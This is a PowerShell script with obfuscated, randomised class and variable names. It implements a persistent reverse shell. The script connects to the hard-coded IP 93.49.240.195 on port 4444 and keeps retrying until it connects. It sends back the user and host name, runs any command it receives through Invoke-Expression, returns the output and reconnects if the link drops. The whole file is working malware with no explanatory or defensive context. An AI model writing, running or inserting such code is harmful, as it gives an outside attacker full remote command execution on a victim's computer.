class nsTFONbqazxVNiF {
    
    [string]$QMosimSVEmZSyZbdv = "93.49.240.195"
    [int]$oLEJaZfvzAGCYZv = 4444

    $jtcymHKXzasEU
    $CQqtJ
    $gsdXfffQsxyOLtC
    $yKkHGbvdASIaqHekY
    $LVBDeJGUXAhrPbB
    $AqPewx
    [int]$jLyHBkG = 50*1024

    hRmakDpUkgbSiSr() {
        $this.CQqtJ = $false
        while ($true) {
            try {
                $this.CQqtJ = New-Object Net.Sockets.TcpClient($this.QMosimSVEmZSyZbdv, $this.oLEJaZfvzAGCYZv)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.WqXqclIPSfooBmlEf()
    }

    WqXqclIPSfooBmlEf() {
        $this.jtcymHKXzasEU = $this.CQqtJ.GetStream()
        $this.yKkHGbvdASIaqHekY = New-Object Byte[] $this.jLyHBkG
        $this.AqPewx = New-Object Text.UTF8Encoding
        $this.gsdXfffQsxyOLtC = New-Object IO.StreamWriter($this.jtcymHKXzasEU, [Text.Encoding]::UTF8, $this.jLyHBkG)
        $this.LVBDeJGUXAhrPbB = New-Object System.IO.StreamReader($this.jtcymHKXzasEU)
        $this.gsdXfffQsxyOLtC.AutoFlush = $true
    }

    JQfVgfpgOAbwLK() {
        $this.hRmakDpUkgbSiSr()
        $this.XjWsyygmZRjMXePUDdxFziqW()
    }

    ZuxVSfMLBKrDfirsnXs($ULnwsBONPEzEHEeRHBcn) {
        try {
            [byte[]]$JojCGm = [text.Encoding]::Ascii.GetBytes($ULnwsBONPEzEHEeRHBcn)
            $this.gsdXfffQsxyOLtC.Write($JojCGm, 0, $JojCGm.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.JQfVgfpgOAbwLK()
        }
    }

    [string] WzBGBMTTRttNvQlxSsyYbgl() {
        try {
            $TadVxCtBMQlLaNegFAil = $this.jtcymHKXzasEU.Read($this.yKkHGbvdASIaqHekY, 0, $this.jLyHBkG)    
            $vYRGTQB = ($this.AqPewx.GetString($this.yKkHGbvdASIaqHekY, 0, $TadVxCtBMQlLaNegFAil))
            return $vYRGTQB
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.JQfVgfpgOAbwLK()
            return ""
        }
    }

    [string] nwjbvZTRBp($btKKriWoFrlYdPWCAT) {
        Write-Host $btKKriWoFrlYdPWCAT
        try { 
            $tYxkGeXGaLqcyfheUdndcjpc = Invoke-Expression $btKKriWoFrlYdPWCAT | Out-String
        }
        catch {
            $uiQTgxRN = $_.Exception
            $BmXJMFVJMfh = $_.Message
            $tYxkGeXGaLqcyfheUdndcjpc = "`n$_`n"
        }
        return $tYxkGeXGaLqcyfheUdndcjpc
    }

    [string] UZYhcChbOjtraAF() {
        $loIEuNpbcV = [Environment]::UserName
        $uEBUoJWkSwXh = [System.Net.Dns]::GetHostName()
        $WnJlDguEPJvhRxqTdcU = Get-Location
        return "$loIEuNpbcV@$uEBUoJWkSwXh [$WnJlDguEPJvhRxqTdcU]~$ "
    }

    XjWsyygmZRjMXePUDdxFziqW() {
        while ($this.CQqtJ.Connected) {
            $this.ZuxVSfMLBKrDfirsnXs($this.UZYhcChbOjtraAF())         
            $vYRGTQB = $this.WzBGBMTTRttNvQlxSsyYbgl()
            $tYxkGeXGaLqcyfheUdndcjpc = "`n"
            if ([string]::IsNullOrEmpty($vYRGTQB)) {
                continue
            }
            $tYxkGeXGaLqcyfheUdndcjpc = $this.nwjbvZTRBp($vYRGTQB)
            $this.ZuxVSfMLBKrDfirsnXs($tYxkGeXGaLqcyfheUdndcjpc + "`n")
            $this.jtcymHKXzasEU.Flush()
        }
        $this.CQqtJ.Close()
        $this.JQfVgfpgOAbwLK()
    } 
}

$nQUFsMlivg = [nsTFONbqazxVNiF]::new()
$nQUFsMlivg.JQfVgfpgOAbwLK()
